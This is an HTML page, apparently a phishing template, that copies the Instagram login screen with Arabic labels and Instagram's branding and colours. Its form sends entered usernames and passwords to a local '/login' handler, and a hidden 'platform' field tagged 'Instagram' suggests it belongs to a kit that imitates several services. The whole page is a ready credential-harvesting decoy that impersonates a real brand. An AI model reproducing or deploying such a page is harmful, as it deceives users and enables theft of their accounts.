<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background-color: #fafafa; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .login-card { background: #ffffff; border: 1px solid #dbdbdb; border-radius: 1px; width: 350px; padding: 40px 40px 20px 40px; text-align: center; margin-bottom: 10px; }
        .logo { font-family: 'Billabong', cursive; font-size: 3rem; margin-bottom: 30px; color: #262626; font-weight: normal; }
        .login-card input { width: 100%; padding: 9px 0 7px 8px; background: #fafafa; border: 1px solid #dbdbdb; border-radius: 3px; box-sizing: border-box; margin-bottom: 6px; font-size: 12px; text-indent: 8px; }
        .login-card input:focus { border-color: #a8a8a8; outline: none; }
        .login-card button { width: 100%; background-color: #0095f6; border: none; border-radius: 4px; color: white; font-weight: 600; padding: 7px; margin-top: 8px; cursor: pointer; font-size: 14px; }
        .login-card button:hover { background-color: #1877f2; }
    </style>
</head>
<body>
    <div class="login-card">
        <h1 class="logo">Instagram</h1>
        <form action="/login" method="POST">
            <input type="hidden" name="platform" value="Instagram">
            <input type="text" name="username" placeholder="اسم الهاتف، اسم المستخدم أو البريد الإلكتروني" required>
            <input type="password" name="password" placeholder="كلمة السر" required>
            <button type="submit">تسجيل الدخول</button>
        </form>
    </div>
</body>
</html>
